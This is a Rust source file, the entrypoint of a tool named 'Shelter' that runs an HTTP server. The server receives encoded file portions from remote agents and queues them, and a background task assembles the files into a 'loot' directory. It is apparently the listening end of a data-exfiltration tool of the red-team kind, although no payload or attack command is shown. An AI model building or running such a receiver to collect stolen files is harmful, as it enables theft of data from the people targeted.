//! Shelter binary entrypoint and runtime bootstrap.
//!
//! This binary exposes a small CLI used to select and configure a server
//! transport (currently an HTTP server) that accepts encoded file portions
//! from remote agents, forwards them into an internal queue and lets a
//! background task assemble and persist the final files.
//!
//! The top-level TODOs below identify obvious future improvements such as
//! providing a configuration file, avoiding CLI/config conflicts and
//! enabling TLS for network transports.
// TODO! Add config file
// TODO! Add parameters which conflicts with config file
// TODO! Add TLS support

use clap::Parser;
use tracing_subscriber::prelude::*;

/// Application entrypoint.
///
/// This function configures logging, creates the tokio mpsc channel used to
/// transfer parsed `ExfiltratedFilePortion` messages to the background
/// processor, spawns the background handler and dispatches the selected CLI
/// subcommand (for example the HTTP server). The function runs inside the
/// Actix runtime provided by the `#[actix_web::main]` attribute.
#[actix_web::main]
async fn main() -> std::io::Result<()> {
    if std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "info");
    }

    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::from_default_env())
        .with(tracing_subscriber::fmt::Layer::default().compact())
        .init();

    let (transfer_channel, receiver_channel): (
        tokio::sync::mpsc::Sender<shelter::ExfiltratedFilePortion>,
        tokio::sync::mpsc::Receiver<shelter::ExfiltratedFilePortion>,
    ) = tokio::sync::mpsc::channel(10);

    let cli_args = shelter::commands::base::Cli::parse();

    log::info!("Launching waiting queue processor tokio channel...");
    tokio::spawn(shelter::event_handler::handle_received_data(
        receiver_channel,
        cli_args.loot_directory.clone(),
    ));

    cli_args.handle(transfer_channel).await
}
